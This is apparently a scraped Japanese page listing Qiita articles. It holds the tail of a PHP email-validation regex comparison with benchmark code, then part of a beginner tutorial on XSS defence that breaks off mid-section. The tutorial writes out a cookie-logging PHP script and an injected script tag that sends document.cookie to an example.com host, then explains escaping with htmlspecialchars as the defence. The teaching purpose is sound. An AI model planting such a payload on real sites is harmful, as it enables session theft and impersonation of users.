    <span class="nv">$dot_atom_loose</span>   <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$atext</span><span class="si">}</span><span class="s2">+(?:[.]|</span><span class="si">{</span><span class="nv">$atext</span><span class="si">}</span><span class="s2">)*"</span><span class="p">;</span> <span class="c1">// 連続したドットと @ の直前のドットを許容する</span>
    <span class="nv">$local_part_loose</span> <span class="o">=</span> <span class="nv">$dot_atom_loose</span><span class="p">;</span> <span class="c1">// 昔の携帯電話メールアドレスで quoted-string 形式なんてあるわけない。たぶん。</span>
    <span class="nv">$addr_spec_loose</span>  <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$local_part_loose</span><span class="si">}</span><span class="s2">[@]</span><span class="si">{</span><span class="nv">$domain</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 合成</span>
    <span class="c1">// 昔の携帯電話メールアドレスの形式をサポートするかで使う正規表現を変える</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$supportPeculiarFormat</span><span class="p">){</span>
        <span class="nv">$regexp</span> <span class="o">=</span> <span class="nv">$addr_spec_loose</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nv">$regexp</span> <span class="o">=</span> <span class="nv">$addr_spec</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// \A は常に文字列の先頭にマッチする。\z は常に文字列の末尾にマッチする。</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\A</span><span class="si">{</span><span class="nv">$regexp</span><span class="si">}</span><span class="s2">\z/"</span><span class="p">,</span> <span class="nv">$email</span><span class="p">)){</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="rfc2822" class="fragment"></span><a href="#rfc2822"><i class="fa fa-link"></i></a>RFC2822</h2>

<p>404 Blog Not Found 管理人の小飼さんが紹介されている有名な記事です。<br>
<a href="http://blog.livedoor.jp/dankogai/archives/51189905.html" class="autolink" rel="nofollow noopener" target="_blank">http://blog.livedoor.jp/dankogai/archives/51189905.html</a><br>
(Perlよく分からないので生成後のコードで勘弁してください)</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">RFC2822'sFunction</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">rfc2822_func</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pattern</span> <span class="o">=</span> 
        <span class="s1">'/^(?:(?:(?:(?:[a-zA-Z0-9_!#\$\%&amp;\'*+\\/=?\^`{}~|\-]+)(?:\.(?:[a-zA-Z0-9_!'</span><span class="o">.</span>
        <span class="s1">'#\$\%&amp;\'*+\\/=?\^`{}~|\-]+))*)|(?:"(?:\\[^\r\n]|[^\\"])*")))\@(?:(?:(?:(?:'</span><span class="o">.</span>
        <span class="s1">'[a-zA-Z0-9_!#\$\%&amp;\'*+\\/=?\^`{}~|\-]+)(?:\.(?:[a-zA-Z0-9_!#\$\%&amp;\'*+\\/=?\^`'</span><span class="o">.</span>
        <span class="s2">"{}~|\-]+))*)|(?:\[(?:</span><span class="se">\\</span><span class="s2">\S|[</span><span class="se">\x21</span><span class="s2">-</span><span class="se">\x5a\x5e</span><span class="s2">-</span><span class="se">\x7e</span><span class="s2">])*\])))$/"</span>
    <span class="p">;</span>
    <span class="k">return</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="phpspot" class="fragment"></span><a href="#phpspot"><i class="fa fa-link"></i></a>phpspot</h2>

<p><a href="http://phpspot.net/php/pg%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%EF%BC%9A%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E8%AA%BF%E3%81%B9%E3%82%8B.html" class="autolink" rel="nofollow noopener" target="_blank">http://phpspot.net/php/pg%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%EF%BC%9A%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E8%AA%BF%E3%81%B9%E3%82%8B.html</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">phpspot'sFunction</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">phpspot_func</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/'</span><span class="p">;</span>
    <span class="k">return</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="検証" class="fragment"></span><a href="#%E6%A4%9C%E8%A8%BC"><i class="fa fa-link"></i></a>検証</h1>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テストコード(ついでにベンチマークも取る)</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$emails</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">Abc@example.com</span>
<span class="s">Abc.123@example.com</span>
<span class="s">user+mailbox/department=shipping@example.com</span>
<span class="s">!#$%&amp;'*+-/=?^_`.{|}~@example.com</span>
<span class="s">"Abc@def"@example.com</span>
<span class="s">"Fred\ Bloggs"@example.com</span>
<span class="s">"Joe.\\Blow"@example.com</span>
<span class="s">".dot_kara_hazimaru"@example.com</span>
<span class="s">"I.likeyou."@example.com</span>
<span class="s">"I..love...you"@example.com</span>
<span class="s">Abc.@example.com</span>
<span class="s">Abc..123@example.com</span>
<span class="s">.dot_kara_hazimaru@example.com</span>
<span class="s">I.like.you.@example.com</span>
<span class="s">I..love...you@example.com</span>
<span class="s">a@[0.0.0.0]</span>
<span class="s">a@[255.255.255.255]</span>
<span class="s">a@[255.255.255.256]</span>
<span class="s">a@[001.002.003.004]</span>
<span class="s">a@[2001:0db8:bd05:01d2:288a:1fc0:0001:10ee]</span>
<span class="s">a@[2001:0db8:bd05:01d2:288a::1fc0:0001:10ee]</span>
<span class="s">a@[2001:0db8:bd05:01d2:288a:1fc0:0001:10ee:11fe]</span>
<span class="s">a@[2001:db8:20:3:1000:100:20:3]</span>
<span class="s">a@[2001:db8::1234:0:0:9abc]</span>
<span class="s">a@[2001:db8::9abc]</span>
<span class="s">a@[::]</span>
<span class="s">a@[0::0]</span>
<span class="s">a@[::1]</span>
<span class="s">a@[1::]</span>
<span class="s">a@[1:2:3:4:5:6:7::]</span>
<span class="s">a@[::255.255.255.255]</span>
<span class="s">a@[::ffff:255.255.255.255]</span>
<span class="s">a@[::ffff:0:255.255.255.255]</span>
<span class="s">a@[2001:db8:3:4::192.0.2.33]</span>
<span class="s">a@[64:ff9b::192.0.2.33]</span>
<span class="s">a@[example.com]</span>
<span class="s">a@[example.com:hoge]</span>
<span class="s">a@0</span>
<span class="s">a@a</span>
<span class="s">a@0.a</span>
<span class="s">a@0.0</span>
<span class="s">a@a.0</span>
<span class="s">a@.a</span>
<span class="s">a@a-.a</span>
<span class="s">a@-a.a</span>
<span class="s">a@a-a.com</span>
<span class="s">a@0-a.com</span>
<span class="s">a@a-0.com</span>
<span class="s">a@a-a.a-a</span>
<span class="s">a@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890.com</span>
<span class="s">a@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678901.com</span>
<span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/@example.com</span>
<span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/a@example.com</span>
<span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"@example.com</span>
<span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/a"@example.com</span>
<span class="s">abcdefhghijklmnopqrstuvwxyzABC@aaaaaaaa01.aaaaaaaa02.aaaaaaaa03.aaaaaaaa04.aaaaaaaa05.aaaaaaaa06.aaaaaaaa07.aaaaaaaa08.aaaaaaaa09.aaaaaaaa10.aaaaaaaa11.aaaaaaaa12.aaaaaaaa13.aaaaaaaa14.aaaaaaaa15.aaaaaaaa16.aaaaaaaa17.aaaaaaaa18.aaaaaaaa19.aaaaaaaa20.com</span>
<span class="s">abcdefhghijklmnopqrstuvwxyzABCD@aaaaaaaa01.aaaaaaaa02.aaaaaaaa03.aaaaaaaa04.aaaaaaaa05.aaaaaaaa06.aaaaaaaa07.aaaaaaaa08.aaaaaaaa09.aaaaaaaa10.aaaaaaaa11.aaaaaaaa12.aaaaaaaa13.aaaaaaaa14.aaaaaaaa15.aaaaaaaa16.aaaaaaaa17.aaaaaaaa18.aaaaaaaa19.aaaaaaaa20.com</span>
<span class="s">"abcdefhghijklmnopqrstuvwxyzABC"@aaaaaaaa01.aaaaaaaa02.aaaaaaaa03.aaaaaaaa04.aaaaaaaa05.aaaaaaaa06.aaaaaaaa07.aaaaaaaa08.aaaaaaaa09.aaaaaaaa10.aaaaaaaa11.aaaaaaaa12.aaaaaaaa13.aaaaaaaa14.aaaaaaaa15.aaaaaaaa16.aaaaaaaa17.aaaaaaaa18.aaaaaaaa19.aaaaaaaa20.com</span>
<span class="s">"abcdefhghijklmnopqrstuvwxyzABCD"@aaaaaaaa01.aaaaaaaa02.aaaaaaaa03.aaaaaaaa04.aaaaaaaa05.aaaaaaaa06.aaaaaaaa07.aaaaaaaa08.aaaaaaaa09.aaaaaaaa10.aaaaaaaa11.aaaaaaaa12.aaaaaaaa13.aaaaaaaa14.aaaaaaaa15.aaaaaaaa16.aaaaaaaa17.aaaaaaaa18.aaaaaaaa19.aaaaaaaa20.com</span>
<span class="dl">EOD</span><span class="p">;</span>

<span class="nv">$emails</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$emails</span><span class="p">);</span>

<span class="nv">$time1_sum</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
<span class="nv">$time2_sum</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
<span class="nv">$time3_sum</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
<span class="nv">$time4_sum</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
<span class="nv">$time5_sum</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">"&lt;h1&gt;Results&lt;/h1&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;table border=</span><span class="se">\"</span><span class="s2">1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;th&gt;E-mail&lt;/th&gt;&lt;th&gt;My Function&lt;/th&gt;&lt;th&gt;PHP Function&lt;/th&gt;&lt;th&gt;DevAchieve's Function&lt;/th&gt;&lt;th&gt;RFC2822's Function&lt;/th&gt;&lt;th&gt;phpspot's Function&lt;/th&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$emails</span> <span class="k">as</span> <span class="nv">$email</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ok</span> <span class="o">=</span> <span class="s1">'&lt;span style="color:green;"&gt;OK&lt;/span&gt;'</span><span class="p">;</span>
    <span class="nv">$ng</span> <span class="o">=</span> <span class="s1">'&lt;span style="color:red;font-weight:bold;"&gt;NG&lt;/span&gt;'</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">800</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$t1</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$r1</span> <span class="o">=</span> <span class="nx">validate_email</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$ok</span> <span class="o">:</span> <span class="nv">$ng</span><span class="p">;</span>
        <span class="nv">$t2</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$r2</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">?</span> <span class="nv">$ok</span> <span class="o">:</span> <span class="nv">$ng</span><span class="p">;</span>
        <span class="nv">$t3</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$r3</span> <span class="o">=</span> <span class="nx">isValidEmailFormat</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$ok</span> <span class="o">:</span> <span class="nv">$ng</span><span class="p">;</span>
        <span class="nv">$t4</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$r4</span> <span class="o">=</span> <span class="nx">rfc2822_func</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$ok</span> <span class="o">:</span> <span class="nv">$ng</span><span class="p">;</span>
        <span class="nv">$t5</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$r5</span> <span class="o">=</span> <span class="nx">phpspot_func</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$ok</span> <span class="o">:</span> <span class="nv">$ng</span><span class="p">;</span>
        <span class="nv">$t6</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="nv">$time1_sum</span> <span class="o">+=</span> <span class="nv">$t2</span> <span class="o">-</span> <span class="nv">$t1</span><span class="p">;</span>
        <span class="nv">$time2_sum</span> <span class="o">+=</span> <span class="nv">$t3</span> <span class="o">-</span> <span class="nv">$t2</span><span class="p">;</span>
        <span class="nv">$time3_sum</span> <span class="o">+=</span> <span class="nv">$t4</span> <span class="o">-</span> <span class="nv">$t3</span><span class="p">;</span>
        <span class="nv">$time4_sum</span> <span class="o">+=</span> <span class="nv">$t5</span> <span class="o">-</span> <span class="nv">$t4</span><span class="p">;</span>
        <span class="nv">$time5_sum</span> <span class="o">+=</span> <span class="nv">$t6</span> <span class="o">-</span> <span class="nv">$t5</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$email</span> <span class="o">=</span> <span class="nb">wordwrap</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="s2">"&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"&lt;tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;td style=</span><span class="se">\"</span><span class="s2">font-family:Consolas, 'Courier New', Courier, Monaco, monospace;</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$email</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$r1</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$r2</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$r3</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$r4</span><span class="si">}</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">{</span><span class="nv">$r5</span><span class="si">}</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">"&lt;/table&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;h1&gt;Benchmarks (Repeated 800 times)&lt;/h1&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">"My Function: %f sec&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$time1_sum</span><span class="p">);</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">"PHP Function: %f sec&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$time2_sum</span><span class="p">);</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">"DevArchive's Function: %f sec&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$time3_sum</span><span class="p">);</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">"RFC2822's Function: %f sec&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$time4_sum</span><span class="p">);</span>
<span class="nb">printf</span><span class="p">(</span><span class="s2">"phpspot's Function: %f sec&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$time5_sum</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"&lt;/p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></div>
</div>

<p><a href="https://camo.qiitausercontent.com/d9907abee6ffadc84570af9d6c8783ffd44892fe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35316332343837332d616363352d663866352d313664322d6535633631666136343939632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d9907abee6ffadc84570af9d6c8783ffd44892fe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35316332343837332d616363352d663866352d313664322d6535633631666136343939632e6a706567" alt="results.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/51c24873-acc5-f8f5-16d2-e5c61fa6499c.jpeg"></a></p>

<ul>
<li>画像このままでは文字小さいので拡大してみてください（笑）</li>
<li><strong>いろいろ情報収集しましたが、私の関数の結果が一番正しいと思います。</strong></li>
<li>なんかIPv6対応させたら重くなっちゃったけどまぁ許容範囲！</li>
<li>Windows版のApacheだと（だけ？）よくfilter_var関数実行中に落ちたりしました。
いろいろ値変えてやってみたけど原因不明でした。</li>
</ul>

<p>そろそろ僕も正規表現ガチ勢名乗っていいですか。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />12位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>98</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/565b3670dd0c7f9162fa">【PHP入門講座】 XSS攻撃への対策</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 20:57:51</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-54acc901cf3408d6b050">目次に戻る</a>
</h3>

<h1>
<span id="xss攻撃" class="fragment"></span><a href="#xss%E6%94%BB%E6%92%83"><i class="fa fa-link"></i></a>XSS攻撃</h1>

<p><strong>XSS(クロスサイトスクリプティング)</strong> 。JavaScriptを実行するコードを制作者の意図していない場所に埋め込む手法であって、PHPを使って実際にプログラミングをしていくうえで真っ先に考えなければいけないのがこの攻撃に対する対策です。</p>

<h2>
<span id="xss攻撃が成功するまでの流れ" class="fragment"></span><a href="#xss%E6%94%BB%E6%92%83%E3%81%8C%E6%88%90%E5%8A%9F%E3%81%99%E3%82%8B%E3%81%BE%E3%81%A7%E3%81%AE%E6%B5%81%E3%82%8C"><i class="fa fa-link"></i></a>XSS攻撃が成功するまでの流れ</h2>

<p><strong>TwitterがXSS攻撃への対策を怠っていたと仮定します。</strong></p>

<h3>
<span id="1-悪意のあるユーザーの下準備" class="fragment"></span><a href="#1-%E6%82%AA%E6%84%8F%E3%81%AE%E3%81%82%E3%82%8B%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E4%B8%8B%E6%BA%96%E5%82%99"><i class="fa fa-link"></i></a>1. 悪意のあるユーザーの下準備</h3>

<p>悪意のあるユーザー(A)が</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">]);</span>
<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'./cookie_log/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span> <span class="nv">$s</span><span class="p">);</span>
</pre></div></div>

<p>のようなスクリプトを</p>

<p><strong><a href="http://example.com/A/cookie_log.php" class="autolink" rel="nofollow noopener" target="_blank">http://example.com/A/cookie_log.php</a></strong></p>

<p>に設置。</p>

<h3>
<span id="2-攻撃コードを埋め込む" class="fragment"></span><a href="#2-%E6%94%BB%E6%92%83%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80"><i class="fa fa-link"></i></a>2. 攻撃コードを埋め込む</h3>

<p>Aは<ins>被害者のユーザー(B)が閲覧可能な場所</ins>、つまりメンション欄に</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span><span class="p">&gt;</span>
<span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
<span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"http://example.com/A/cookie_log.php?"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div></div>

<p>以上の攻撃コードが埋め込まれたツイートを届ける。</p>

<h3>
<span id="3-被害者のcookie情報が流出する" class="fragment"></span><a href="#3-%E8%A2%AB%E5%AE%B3%E8%80%85%E3%81%AEcookie%E6%83%85%E5%A0%B1%E3%81%8C%E6%B5%81%E5%87%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>3. 被害者のCookie情報が流出する</h3>

<p>Bのブラウザが、読み込まれたJavaScriptコードに従って画像を取りに行こうとするので、そのときに</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="s2">"http://example.com/A/cookie_log.php?"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</pre></div></div>

<p>に対して、<ins>自分自身のCookie情報をURLに付加して</ins>リクエストが実行されてしまう。</p>

<h3>
<span id="4-被害発生" class="fragment"></span><a href="#4-%E8%A2%AB%E5%AE%B3%E7%99%BA%E7%94%9F"><i class="fa fa-link"></i></a>4. 被害発生</h3>

<p><code>cookie_log.php</code> は送られてきたCookie情報を保存する。やがてそれをAが入手することとなり、彼はBの<ins>ログイン済みの</ins>Cookie情報を利用し、Bに成りすまして好き放題ツイートしたり出来る。</p>

<h2>
<span id="対策方法" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>対策方法</h2>

<p><code>&lt;</code> <code>&gt;</code> を <strong>実体参照</strong> に置換してしまえば、それだけでJavaScriptコードの実行を<ins>だいたい</ins>防ぐことが出来ます。この処理を、HTML特殊文字を <strong>「エスケープする」</strong> といいます。一口にエスケープするといっても様々なエスケープがあり、<ins>何のためにエスケープするのかが重要</ins>です。</p>

<p>PHPではこの処理を行うための <code>htmlspecialchars</code> という関数が標準で用意されています。しかしこの関数は関数名が長い上に、パラメータも実質3つは必須となっており、そのままでは非常に使い勝手が悪いです。そこでそれを使いやすく包み込んだ <strong>ラッパー関数</strong> を作成します。ユーザー定義関数を初めて作成する項となりますが、まだ関数についての説明はそれほど行っていないので軽く流してください。</p>

<p><strong>htmlspecialchars</strong><br>
<a href="http://php.net/manual/ja/function.htmlspecialchars.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.htmlspecialchars.php</a></p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p><code>$str</code> で引数を1つ受け取り、それを <code>htmlspecialchars</code> 関数に渡しています。この関数はデフォルトでは以下の変換を行います。</p>

<ul>
<li>
<code>&lt;</code> → <strong><code>&amp;lt;</code></strong>
</li>
<li>
<code>&gt;</code> → <strong><code>&amp;gt;</code></strong>
</li>
<li>
<code>&amp;</code> → <strong><code>&amp;amp;</code></strong>
</li>
<li>
<code>"</code> → <strong><code>&amp;quot;</code></strong>
</li>
</ul>

<p>第2引数に <code>ENT_QUOTES</code> を指定すると、下記の変換も行うようになります。</p>

<ul>
<li>
<code>'</code> → <strong><code>&amp;apos;</code></strong>
</li>
</ul>

<p>第3引数では文字コードを指定します。ここでの詳しい説明は割愛しますが、互換性の面から <code>UTF-8</code> と省略せずに指定しておくことをオススメします。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="s1">'&lt;a href="test.php?a=b&amp;amp;c=d"&gt;Test&lt;/a&gt;'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="ni">&amp;lt;</span>a href=<span class="ni">&amp;quot;</span>test.php?a=b<span class="ni">&amp;amp;</span>amp;c=d<span class="ni">&amp;quot;&amp;gt;</span>Test<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
</pre></div>
</div>

<h3>
<span id="だいたいな理由" class="fragment"></span><a href="#%E3%81%A0%E3%81%84%E3%81%9F%E3%81%84%E3%81%AA%E7%90%86%E7%94%B1"><i class="fa fa-link"></i></a>「だいたい」な理由</h3>

<p>このようにHTML特殊文字のエスケープを行っても防げないケースがあるからです。</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
